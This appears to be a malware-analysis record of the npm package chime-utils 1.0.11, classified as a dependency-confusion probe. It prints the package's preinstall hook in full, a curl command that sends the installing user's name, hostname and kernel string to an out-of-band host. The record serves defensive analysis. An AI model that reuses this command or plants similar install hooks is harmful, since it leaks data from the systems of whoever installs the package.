# npm chime-utils@1.0.11

**Source:** datadog · **Source label:** malicious · **Released:** 2025-07-24 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The only install-time code is the `preinstall` hook in `package.json`, an inline shell command. It runs `curl -G` against an OAST interaction host and URL-encodes the output of `whoami`, `hostname` and `uname -a` into the query string. Nothing is gated: no conditions in the hook, no install-reached JS files, no manifest platform restrictions. Any install on a POSIX shell with curl and outbound HTTP sends the beacon.

## Execution

- **preinstall** `curl -G hxxp://d20uqm11og84el5gigk0ngfcuupjn3bg8[.]oast[.]online --data-urlencode whoami=$(whoami) --data-urlencode hostname=$(hostname) --data-urlencode uname=$(uname -a)`: no package files; inline_shell.

## Gates

None.

## Requirements

- network: d20uqm11og84el5gigk0ngfcuupjn3bg8[.]oast[.]online:80 (curl sends the collected host data to this OAST host over plain HTTP)
- installed_tool: curl (the hook command runs curl)
- installed_tool: whoami, hostname, uname (command substitutions in the hook collect their output)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- The prefilled launch style `download_then_exec` was replaced with `inline_shell`, because the curl response is never executed.
- `index.js` is just a placeholder comment. The nested `chime-utils-poc/package.json` has only a `test` script and is not run.
- The manifest describes it as a "Chime internal package". Together with the OAST host, this points to dependency confusion (a bug-bounty style probe), not a typosquat.
- On Windows under cmd, the `$(...)` substitutions are not expanded, so only literal strings would be sent.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "chime-utils",
    "version": "1.0.11",
    "archive_sha256": "10d91f169f7feb97c5987f2a7947d6b15c8f9e4cc589bb3227a361627bab5443",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-07-24",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-07-24-chime-utils-v1.0.11.zip",
    "package_root": "layer0/tmp/tmppvaoc9tp/chime-utils/package",
    "cluster_key": "787194cde65345c076a91bacd916b21c58f50f4ad0c06cc12eeaa2eecf167c61",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "curl -G hxxp://d20uqm11og84el5gigk0ngfcuupjn3bg8[.]oast[.]online --data-urlencode whoami=$(whoami) --data-urlencode hostname=$(hostname) --data-urlencode uname=$(uname -a)",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "preinstall is one curl GET carrying whoami, hostname and uname -a output as query parameters. The response is not executed, so the prefilled download_then_exec was replaced with inline_shell.",
      "The $(...) substitutions need a POSIX shell. Under npm's default cmd shell on Windows they are not expanded, so only literal text would be sent.",
      "index.js is a one-line placeholder comment and chime-utils-poc/package.json only has a test script; neither runs at install.",
      "The hook command has no conditions and the tool found no candidates; nothing is gated."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "d20uqm11og84el5gigk0ngfcuupjn3bg8[.]oast[.]online:80",
      "reason": "curl sends the collected host data to this OAST host over plain HTTP"
    },
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "the hook command runs curl"
    },
    {
      "axis": "installed_tool",
      "value": "whoami, hostname, uname",
      "reason": "command substitutions in the hook collect their output"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxp://d20uqm11og84el5gigk0ngfcuupjn3bg8[.]oast[.]online",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "OAST dependency-confusion recon beacon",
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook unconditionally sends the user name, hostname and kernel string to an out-of-band interaction (OAST) host with curl. The package calls itself an internal company utility and ships only placeholder code, the usual shape of a dependency-confusion probe.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
